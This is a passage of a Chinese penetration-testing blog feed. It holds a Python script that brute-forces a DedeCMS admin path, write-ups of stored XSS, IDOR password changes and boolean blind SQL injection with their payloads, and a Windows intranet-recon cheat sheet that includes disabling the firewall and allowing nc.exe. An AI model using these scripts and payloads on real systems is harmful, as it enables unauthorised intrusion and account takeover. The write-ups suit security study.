data[&quot;_FILES[tools][tmp_name]&quot;] &#x3D; &quot;%s&#123;p&#125;&lt;&lt;&#x2F;images&#x2F;adminico.gif&quot; % prefix</span><br><span class="line">                        break</span><br><span class="line">                    else:</span><br><span class="line">                        data[&quot;_FILES[tools][tmp_name]&quot;] &#x3D; &quot;%s&#123;p&#125;&lt;&lt;&#x2F;images&#x2F;adminico.gif&quot; % prefix</span><br><span class="line">            # print(&quot;[+] 前缀为：&quot;,back_dir)</span><br><span class="line">            flag &#x3D; 0</span><br><span class="line">            for i in range(30):</span><br><span class="line">                if flag:</span><br><span class="line">                    break</span><br><span class="line">                for ch in characters:</span><br><span class="line">                    if ch &#x3D;&#x3D; characters[-1]:</span><br><span class="line">                        flag &#x3D; 1</span><br><span class="line">                        break</span><br><span class="line">                    data[&quot;_FILES[tools][tmp_name]&quot;] &#x3D; data[&quot;_FILES[tools][tmp_name]&quot;].format(p&#x3D;back_dir + ch)</span><br><span class="line">                    r &#x3D; requests.post(self.target + f_name, data&#x3D;data)</span><br><span class="line">                    if &quot;Upload filetype not allow !&quot; not in r.text and r.status_code &#x3D;&#x3D; 200:</span><br><span class="line">                        back_dir +&#x3D; ch</span><br><span class="line">                        # print(&quot;[+] &quot;,back_dir)</span><br><span class="line">                        data[&quot;_FILES[tools][tmp_name]&quot;] &#x3D; &quot;%s&#123;p&#125;&lt;&lt;&#x2F;images&#x2F;adminico.gif&quot; % prefix</span><br><span class="line">                        break</span><br><span class="line">                    else:</span><br><span class="line">                        data[&quot;_FILES[tools][tmp_name]&quot;] &#x3D; &quot;%s&#123;p&#125;&lt;&lt;&#x2F;images&#x2F;adminico.gif&quot; % prefix</span><br><span class="line">            show_message[&#39;Login_url&#39;] &#x3D; self.target + &quot;&#x2F;%s&quot; % back_dir</span><br><span class="line"></span><br><span class="line">            print(show_message)</span><br><span class="line">            return show_message</span><br><span class="line">        else:</span><br><span class="line">            check_message[&#39;Enumerate&#39;] &#x3D; False</span><br><span class="line">            print(check_message)</span><br><span class="line">            return check_message</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main(url):</span><br><span class="line">    N &#x3D; Bute_Login(url)</span><br><span class="line">    N.Bute()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">usage:        python .\dede_login.py -u [url]http:&#x2F;&#x2F;www.chuheautism.com[&#x2F;url]</span><br><span class="line">output:</span><br><span class="line">                (&#39;testing&#39;, &#39;a&#39;)</span><br><span class="line">                (&#39;testing&#39;, &#39;b&#39;)</span><br><span class="line">                (&#39;testing&#39;, &#39;c&#39;)</span><br><span class="line">                &#123;&#39;Login_url&#39;: &#39;http:&#x2F;&#x2F;www.chuheautism.com&#x2F;cha&#39;&#125;</span><br><span class="line"></span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    if sys.argv[1] &#x3D;&#x3D; &quot;-u&quot;:</span><br><span class="line">        main(sys.argv[2])</span><br></pre></td></tr></table></figure><p>python环境为3.6，运行脚本：python dedecms.py -u url</p><p>跑的有点久，不过后台路径还是跑出来了，结果如图：</p><p><img src="/2021/06/15/dedecms%E6%8C%96%E6%8E%98/04.jpg" alt="图4"></p><p>尝试了一些弱口令，无果，一些网站后台会使用该网站的域名当做用户和密码，将当前网站域名当做用户名和密码，直接登录进来。</p><p><img src="/2021/06/15/dedecms%E6%8C%96%E6%8E%98/05.jpg" alt="图5"></p><p>注：当前模板dedecms有修改过的，试了一些网上爆出的漏洞都无法利用，尝试后台上传文件，结果有waf存在，无法上传，就不描述了。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;一、存储型XSS&quot;&gt;&lt;a href=&quot;#一、存储型XSS&quot; class=&quot;headerlink&quot; title=&quot;一、存储型XSS&quot;&gt;&lt;/a&gt;一、存储型XSS&lt;/h2&gt;&lt;p&gt;在一次测试中通过CMS指纹识别出是dedecms模板，网上爆出过当前CMS的多种漏洞，逐一尝</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>猜测隐藏参数之越权</title>
    <link href="http://example.com/2021/05/04/%E7%8C%9C%E6%B5%8B%E9%9A%90%E8%97%8F%E5%8F%82%E6%95%B0%E4%B9%8B%E8%B6%8A%E6%9D%83/"/>
    <id>http://example.com/2021/05/04/%E7%8C%9C%E6%B5%8B%E9%9A%90%E8%97%8F%E5%8F%82%E6%95%B0%E4%B9%8B%E8%B6%8A%E6%9D%83/</id>
    <published>2021-05-04T01:24:23.628Z</published>
    <updated>2022-03-06T06:26:45.190Z</updated>
    
    <content type="html"><![CDATA[<h4 id="本人在攻防演练的时候遇到的一些漏洞如下："><a href="#本人在攻防演练的时候遇到的一些漏洞如下：" class="headerlink" title="本人在攻防演练的时候遇到的一些漏洞如下："></a>本人在攻防演练的时候遇到的一些漏洞如下：</h4><h2 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h2><ol><li><h4 id="登录注册好的测试账号，点击设置修改个人信息"><a href="#登录注册好的测试账号，点击设置修改个人信息" class="headerlink" title="登录注册好的测试账号，点击设置修改个人信息"></a>登录注册好的测试账号，点击设置修改个人信息</h4></li></ol><p><img src="/2021/05/04/%E7%8C%9C%E6%B5%8B%E9%9A%90%E8%97%8F%E5%8F%82%E6%95%B0%E4%B9%8B%E8%B6%8A%E6%9D%83/01.jpg" alt="图1"></p><ol start="2"><li><h4 id="这里文件上传处只对前端进行校验，编写好触发xss的代码文件，将它命名为aaa-jpg，文件内容如下："><a href="#这里文件上传处只对前端进行校验，编写好触发xss的代码文件，将它命名为aaa-jpg，文件内容如下：" class="headerlink" title="这里文件上传处只对前端进行校验，编写好触发xss的代码文件，将它命名为aaa.jpg，文件内容如下："></a>这里文件上传处只对前端进行校验，编写好触发xss的代码文件，将它命名为aaa.jpg，文件内容如下：</h4></li></ol><p><img src="/2021/05/04/%E7%8C%9C%E6%B5%8B%E9%9A%90%E8%97%8F%E5%8F%82%E6%95%B0%E4%B9%8B%E8%B6%8A%E6%9D%83/image-20220305013341802.png" alt="image-20220305013341802"></p><ol start="3"><li><h4 id="burp抓包，修改后缀名和文件格式，上传成功！"><a href="#burp抓包，修改后缀名和文件格式，上传成功！" class="headerlink" title="burp抓包，修改后缀名和文件格式，上传成功！"></a>burp抓包，修改后缀名和文件格式，上传成功！</h4></li></ol><p><img src="/2021/05/04/%E7%8C%9C%E6%B5%8B%E9%9A%90%E8%97%8F%E5%8F%82%E6%95%B0%E4%B9%8B%E8%B6%8A%E6%9D%83/03.jpg" alt="图3"></p><ol start="4"><li><h4 id="访问图像链接，触发xss！（这里上传过冰蝎的马，但是保存图片的目录没有权限执行文件，连接失败）"><a href="#访问图像链接，触发xss！（这里上传过冰蝎的马，但是保存图片的目录没有权限执行文件，连接失败）" class="headerlink" title="访问图像链接，触发xss！（这里上传过冰蝎的马，但是保存图片的目录没有权限执行文件，连接失败）"></a>访问图像链接，触发xss！（这里上传过冰蝎的马，但是保存图片的目录没有权限执行文件，连接失败）</h4></li></ol><p><img src="/2021/05/04/%E7%8C%9C%E6%B5%8B%E9%9A%90%E8%97%8F%E5%8F%82%E6%95%B0%E4%B9%8B%E8%B6%8A%E6%9D%83/04.jpg" alt="图4"></p><h2 id="越权修改密码"><a href="#越权修改密码" class="headerlink" title="越权修改密码"></a>越权修改密码</h2><ol><li><h4 id="还是刚刚那个站点，在后台管理那可以登录创建的账号"><a href="#还是刚刚那个站点，在后台管理那可以登录创建的账号" class="headerlink" title="还是刚刚那个站点，在后台管理那可以登录创建的账号"></a>还是刚刚那个站点，在后台管理那可以登录创建的账号</h4></li></ol><p><img src="/2021/05/04/%E7%8C%9C%E6%B5%8B%E9%9A%90%E8%97%8F%E5%8F%82%E6%95%B0%E4%B9%8B%E8%B6%8A%E6%9D%83/05.jpg" alt="图5"></p><ol start="2"><li><h4 id="点击修改个人头像"><a href="#点击修改个人头像" class="headerlink" title="点击修改个人头像"></a>点击修改个人头像</h4></li></ol><p><img src="/2021/05/04/%E7%8C%9C%E6%B5%8B%E9%9A%90%E8%97%8F%E5%8F%82%E6%95%B0%E4%B9%8B%E8%B6%8A%E6%9D%83/06.jpg" alt="图6"></p><ol start="3"><li><h4 id="看到id值，创建另一个测试账号，将当前账号id值为246改为另一个测试账号id为247，发现修改成功！"><a href="#看到id值，创建另一个测试账号，将当前账号id值为246改为另一个测试账号id为247，发现修改成功！" class="headerlink" title="看到id值，创建另一个测试账号，将当前账号id值为246改为另一个测试账号id为247，发现修改成功！"></a>看到id值，创建另一个测试账号，将当前账号id值为246改为另一个测试账号id为247，发现修改成功！</h4></li></ol><p><img src="/2021/05/04/%E7%8C%9C%E6%B5%8B%E9%9A%90%E8%97%8F%E5%8F%82%E6%95%B0%E4%B9%8B%E8%B6%8A%E6%9D%83/07.jpg" alt="图7"></p><ol start="4"><li><h4 id="因为修改的都是普通数据，没什么可用处，这边也没有找到能够修改密码的功能模块。于是我又继续尝试寻找漏洞。在这边有看到传一个旧密码的参数olderpassword，盲猜一下可能传入一个新密码参数能够修改密码。于是添加登录进来时传的密码参数password，更新用户成功！"><a href="#因为修改的都是普通数据，没什么可用处，这边也没有找到能够修改密码的功能模块。于是我又继续尝试寻找漏洞。在这边有看到传一个旧密码的参数olderpassword，盲猜一下可能传入一个新密码参数能够修改密码。于是添加登录进来时传的密码参数password，更新用户成功！" class="headerlink" title="因为修改的都是普通数据，没什么可用处，这边也没有找到能够修改密码的功能模块。于是我又继续尝试寻找漏洞。在这边有看到传一个旧密码的参数olderpassword，盲猜一下可能传入一个新密码参数能够修改密码。于是添加登录进来时传的密码参数password，更新用户成功！"></a>因为修改的都是普通数据，没什么可用处，这边也没有找到能够修改密码的功能模块。于是我又继续尝试寻找漏洞。在这边有看到传一个旧密码的参数olderpassword，盲猜一下可能传入一个新密码参数能够修改密码。于是添加登录进来时传的密码参数password，更新用户成功！</h4></li></ol><p><img src="/2021/05/04/%E7%8C%9C%E6%B5%8B%E9%9A%90%E8%97%8F%E5%8F%82%E6%95%B0%E4%B9%8B%E8%B6%8A%E6%9D%83/08.jpg" alt="图8"></p><ol start="5"><li><h4 id="使用新密码登录另一个测试账号成功！"><a href="#使用新密码登录另一个测试账号成功！" class="headerlink" title="使用新密码登录另一个测试账号成功！"></a>使用新密码登录另一个测试账号成功！</h4></li></ol><p><img src="/2021/05/04/%E7%8C%9C%E6%B5%8B%E9%9A%90%E8%97%8F%E5%8F%82%E6%95%B0%E4%B9%8B%E8%B6%8A%E6%9D%83/09.jpg" alt="图9"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;本人在攻防演练的时候遇到的一些漏洞如下：&quot;&gt;&lt;a href=&quot;#本人在攻防演练的时候遇到的一些漏洞如下：&quot; class=&quot;headerlink&quot; title=&quot;本人在攻防演练的时候遇到的一些漏洞如下：&quot;&gt;&lt;/a&gt;本人在攻防演练的时候遇到的一些漏洞如下：&lt;/h4&gt;&lt;</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>input类型为hidden时触发xss</title>
    <link href="http://example.com/2021/04/16/input%E7%B1%BB%E5%9E%8B%E4%B8%BAhidden%E6%97%B6%E8%A7%A6%E5%8F%91xss/"/>
    <id>http://example.com/2021/04/16/input%E7%B1%BB%E5%9E%8B%E4%B8%BAhidden%E6%97%B6%E8%A7%A6%E5%8F%91xss/</id>
    <published>2021-04-16T09:01:29.625Z</published>
    <updated>2022-03-06T06:24:09.478Z</updated>
    
    <content type="html"><![CDATA[<p>在接到一次扫描任务中，使用awvs扫描到一个xss漏洞，awvs显示结果：</p><p><img src="/2021/04/16/input%E7%B1%BB%E5%9E%8B%E4%B8%BAhidden%E6%97%B6%E8%A7%A6%E5%8F%91xss/01.jpg" alt="图1"></p><p>将payload解码获得的url为：/zaixianWeb/bidding/AppointmentOnLine.aspx/&quot;onmouseover=&#39;8xCP(99012)&#39;bad=&quot;，</p><p>burp抓包查看详情</p><p><img src="/2021/04/16/input%E7%B1%BB%E5%9E%8B%E4%B8%BAhidden%E6%97%B6%E8%A7%A6%E5%8F%91xss/02.jpg" alt="图2"></p><p>可以看到已经插入成功了，但是因为input是hidden，hidden表示隐藏标签属性，onmouseover或者onclick都无法进行触发，使用以下payload进行触发：&quot;accesskey=&#39;X&#39;onclick=&#39;alert(1)&#39;&quot;</p><p><img src="/2021/04/16/input%E7%B1%BB%E5%9E%8B%E4%B8%BAhidden%E6%97%B6%E8%A7%A6%E5%8F%91xss/03.jpg" alt="图3"></p><p>accesskey的作用是accesskey 属性规定激活（使元素获得焦点）元素的快捷键。</p><p>payload插入后，在当前页面按住键盘键alt+shift+x成功触发xss</p><p><img src="/2021/04/16/input%E7%B1%BB%E5%9E%8B%E4%B8%BAhidden%E6%97%B6%E8%A7%A6%E5%8F%91xss/04.jpg" alt="图4"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;在接到一次扫描任务中，使用awvs扫描到一个xss漏洞，awvs显示结果：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2021/04/16/input%E7%B1%BB%E5%9E%8B%E4%B8%BAhidden%E6%97%B6%E8%A7%A6%E5%8F%91xss/0</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>记一次遇到的布尔盲注</title>
    <link href="http://example.com/2021/04/08/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%81%87%E5%88%B0%E7%9A%84%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/"/>
    <id>http://example.com/2021/04/08/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%81%87%E5%88%B0%E7%9A%84%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/</id>
    <published>2021-04-08T06:36:38.862Z</published>
    <updated>2022-03-06T06:27:00.592Z</updated>
    
    <content type="html"><![CDATA[<ol><li>在一次工作中使用awvs14跑出一个可能存在布尔盲注，页面如下：</li></ol><p><img src="/2021/04/08/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%81%87%E5%88%B0%E7%9A%84%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/01.jpg" alt="图1"></p><ol start="2"><li>页面内容返回了一个0，使用单引号，双引号闭合，发现单引号闭合会报错跳到其他页面，说明是单引号闭合。</li></ol><p><img src="/2021/04/08/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%81%87%E5%88%B0%E7%9A%84%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/02.jpg" alt="图2"></p><ol start="3"><li>使用payload: 0&#39; --+  返回页面数据0，0&#39; and 1 --+ 也是返回数据0, 0&#39; or 1 --+ 返回页面数据851326，确认执行了语句，说明存在布尔盲注。</li></ol><p><img src="/2021/04/08/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%81%87%E5%88%B0%E7%9A%84%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/03.jpg" alt="图3"></p><ol start="4"><li>使用sqlma跑一遍，没有跑出结果来，还想着能省点事的，看来只能手工进行验证了。</li></ol><p><img src="/2021/04/08/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%81%87%E5%88%B0%E7%9A%84%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/04.jpg" alt="图4"></p><ol start="5"><li>既然是布尔盲注，那就省去了猜字段的步骤。经过测试，数据库类型是mysql，加上该网站并没有过滤危险参数，使用payload：0&#39; and length(database())&gt;0 –+ 还有payload：0&#39; and length(database())&gt;100 –+ 发现两次payload返回的页面数据都是0，这样没法判断该payload执行的结果是否正确。</li></ol><p><img src="/2021/04/08/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%81%87%E5%88%B0%E7%9A%84%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/05.jpg" alt="图5"></p><p><img src="/2021/04/08/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%81%87%E5%88%B0%E7%9A%84%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/06.jpg" alt="图6"></p><ol start="6"><li>参数为domain，猜测是需要传一个为域名的参数，随便填其他的参数也是返回0，说明参数不是正确的值就会返回0。</li></ol><p><img src="/2021/04/08/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%81%87%E5%88%B0%E7%9A%84%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/12.jpg" alt="图11"></p><ol start="7"><li>那就在前面添加一个or 1，这样就能返回一个正确的结果。构造payload：0&#39; or 1 and length(database())&gt;0 --+ 和payload：0&#39; or 1 and length(database())&gt;100 --+，返回不同的页面数据，由此推断出当返回851326页面数据的时候，说明执行的布尔语句条件为真。</li></ol><p><img src="/2021/04/08/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%81%87%E5%88%B0%E7%9A%84%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/07.jpg" alt="图7"></p><p><img src="/2021/04/08/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%81%87%E5%88%B0%E7%9A%84%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/08.jpg" alt="图8"></p><ol start="8"><li>使用二分法得出数据库的长度为12。</li></ol><p><img src="/2021/04/08/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%81%87%E5%88%B0%E7%9A%84%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/09.jpg" alt="图9"></p><ol start="9"><li>使用payload：0&#39;  or 1 and substr(database(),1,1)=&#39;a&#39; --+获取数据库名字，burp抓包，添加到intruder爆破模块，添加所需要爆破的参数，点击start attack开始爆破。</li></ol><p><img src="/2021/04/08/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%81%87%E5%88%B0%E7%9A%84%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/10.jpg" alt="图10"></p><ol start="10"><li>根据length的数量得出数据库的名字。</li></ol><p><img src="/2021/04/08/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%81%87%E5%88%B0%E7%9A%84%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/11.jpg" alt="图11"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;ol&gt;
&lt;li&gt;在一次工作中使用awvs14跑出一个可能存在布尔盲注，页面如下：&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img src=&quot;/2021/04/08/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%81%87%E5%88%B0%E7%9A%84%E5%B8%8</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>内网信息收集</title>
    <link href="http://example.com/2021/03/18/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <id>http://example.com/2021/03/18/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</id>
    <published>2021-03-18T08:41:17.955Z</published>
    <updated>2021-03-18T08:45:48.002Z</updated>
    
    <content type="html"><![CDATA[<h1 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h1><h2 id="手动收集信息"><a href="#手动收集信息" class="headerlink" title="手动收集信息"></a>手动收集信息</h2><h3 id="查询网络配置信息"><a href="#查询网络配置信息" class="headerlink" title="查询网络配置信息"></a>查询网络配置信息</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconifg &#x2F;all</span><br></pre></td></tr></table></figure><h3 id="查询操作系统版本"><a href="#查询操作系统版本" class="headerlink" title="查询操作系统版本"></a>查询操作系统版本</h3><p>获取操作系统和版本信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo | findstr &#x2F;B &#x2F;C:&quot;OS 名称&quot; &#x2F;C:&quot;OS 版本&quot;</span><br></pre></td></tr></table></figure><p>如果是英文操作系统</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo | findstr &#x2F;B &#x2F;C:&quot;OS Name&quot; &#x2F;C:&quot;OS Version&quot;</span><br></pre></td></tr></table></figure><h3 id="查看系统体系结构"><a href="#查看系统体系结构" class="headerlink" title="查看系统体系结构"></a>查看系统体系结构</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo %PROCESSOR_ARCHITECTURE%</span><br></pre></td></tr></table></figure><h3 id="安装软件版本信息"><a href="#安装软件版本信息" class="headerlink" title="安装软件版本信息"></a>安装软件版本信息</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic product get name,version</span><br></pre></td></tr></table></figure><p>利用powershell命令，收集软件版本系信息条</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell &quot;Get-WmiObject -class Win32_Product |Select-Object -Property name,version&quot;</span><br></pre></td></tr></table></figure><h3 id="查看本机服务信息"><a href="#查看本机服务信息" class="headerlink" title="查看本机服务信息"></a>查看本机服务信息</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic service list brief</span><br></pre></td></tr></table></figure><h3 id="查看进程列表信息"><a href="#查看进程列表信息" class="headerlink" title="查看进程列表信息"></a>查看进程列表信息</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist &#x2F;v</span><br></pre></td></tr></table></figure><ul><li>或者如下命令也可以</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic process list brief</span><br></pre></td></tr></table></figure><h3 id="常见软件杀毒表"><a href="#常见软件杀毒表" class="headerlink" title="常见软件杀毒表"></a>常见软件杀毒表</h3><table><thead><tr><th align="center">进程</th><th align="center">软件名称</th></tr></thead><tbody><tr><td align="center">360SD.exe</td><td align="center">360杀毒</td></tr><tr><td align="center">360TRAY.exe</td><td align="center">360实时保护</td></tr><tr><td align="center">ZHUDONGFANGYU.exe</td><td align="center">360主动防御</td></tr><tr><td align="center">KSAFETRAY.exe</td><td align="center">金山卫士</td></tr><tr><td align="center">SAFEDOGUPDATECENTER.exe</td><td align="center">服务器安全狗</td></tr><tr><td align="center">MCAFEE MCSHIELD.exe</td><td align="center">MCAFEE</td></tr><tr><td align="center">EGULEXE</td><td align="center">NoD32</td></tr><tr><td align="center">AVP.exe</td><td align="center">卡巴斯基</td></tr><tr><td align="center">AVGUARD.exe</td><td align="center">小红伞</td></tr><tr><td align="center">BDAGENT.exe</td><td align="center">BITDEFENDER</td></tr></tbody></table><h3 id="查看启动程序信息"><a href="#查看启动程序信息" class="headerlink" title="查看启动程序信息"></a>查看启动程序信息</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic startup get command,caption</span><br></pre></td></tr></table></figure><h3 id="查看计划任务"><a href="#查看计划任务" class="headerlink" title="查看计划任务"></a>查看计划任务</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks &#x2F;query &#x2F;fo  LIST &#x2F;v</span><br></pre></td></tr></table></figure><p>PS：如果遇到资源无法加载问题，则是由于当前活动页码所致，之后，我们可以将活动页码修改为437即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chcp 437</span><br></pre></td></tr></table></figure><h3 id="查看用户列表信息"><a href="#查看用户列表信息" class="headerlink" title="查看用户列表信息"></a>查看用户列表信息</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user</span><br></pre></td></tr></table></figure><h3 id="获取本地管理员信息"><a href="#获取本地管理员信息" class="headerlink" title="获取本地管理员信息"></a>获取本地管理员信息</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup administrators</span><br></pre></td></tr></table></figure><h3 id="查看当前在线用户信息"><a href="#查看当前在线用户信息" class="headerlink" title="查看当前在线用户信息"></a>查看当前在线用户信息</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query user || qwinsta</span><br></pre></td></tr></table></figure><h3 id="查看会话信息"><a href="#查看会话信息" class="headerlink" title="查看会话信息"></a>查看会话信息</h3><ul><li>执行如下命令(需要管理员权限才行)，列出或断开本地计算机和连接的客户端的会话</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net session</span><br></pre></td></tr></table></figure><h3 id="查看端口列表信息"><a href="#查看端口列表信息" class="headerlink" title="查看端口列表信息"></a>查看端口列表信息</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat –ano</span><br></pre></td></tr></table></figure><h3 id="查询补丁列表信息"><a href="#查询补丁列表信息" class="headerlink" title="查询补丁列表信息"></a>查询补丁列表信息</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Systeminfo</span><br></pre></td></tr></table></figure><ul><li>同时也可以使用wmic来识别安装在系统中的补丁情况</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br></pre></td></tr></table></figure><h3 id="本机共享信息"><a href="#本机共享信息" class="headerlink" title="本机共享信息"></a>本机共享信息</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net share</span><br></pre></td></tr></table></figure><ul><li>利用wmic查找共享</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic share get name,path,status</span><br></pre></td></tr></table></figure><h3 id="查询路由和缓存表"><a href="#查询路由和缓存表" class="headerlink" title="查询路由和缓存表"></a>查询路由和缓存表</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">route print</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp -a</span><br></pre></td></tr></table></figure><h3 id="查询防火墙配置"><a href="#查询防火墙配置" class="headerlink" title="查询防火墙配置"></a>查询防火墙配置</h3><h5 id="关闭防火墙配置"><a href="#关闭防火墙配置" class="headerlink" title="关闭防火墙配置:"></a>关闭防火墙配置:</h5><ul><li>Windows Server 2003系统及以前版本</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall set opmode disable</span><br></pre></td></tr></table></figure><ul><li>Windows Server 2003系统及之后的版本</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure><h5 id="查询防火墙配置-1"><a href="#查询防火墙配置-1" class="headerlink" title="查询防火墙配置"></a>查询防火墙配置</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall show config</span><br></pre></td></tr></table></figure><h5 id="修改防火墙配置"><a href="#修改防火墙配置" class="headerlink" title="修改防火墙配置"></a>修改防火墙配置</h5><ul><li>Windows Server 2003系统及之前版本</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall add allowedprogram c:\nc.exe &quot;allow nc&quot; enable</span><br></pre></td></tr></table></figure><p>Windows server 2003 之后系统版本</p><ul><li>允许指定程序连入，命令如下:</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall firewall add rule name&#x3D;&quot;pass nc&quot; dir&#x3D;in action&#x3D;allow program&#x3D;&quot;C: \nc.exe&quot;</span><br></pre></td></tr></table></figure><ul><li>允许指定程序连出，命令如下：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall firewall add rule name&#x3D;&quot;pass nc&quot; dir&#x3D;in action&#x3D;allow program&#x3D;&quot;C: \nc.exe&quot;</span><br></pre></td></tr></table></figure><h5 id="允许3389端口放行"><a href="#允许3389端口放行" class="headerlink" title="允许3389端口放行"></a>允许3389端口放行</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 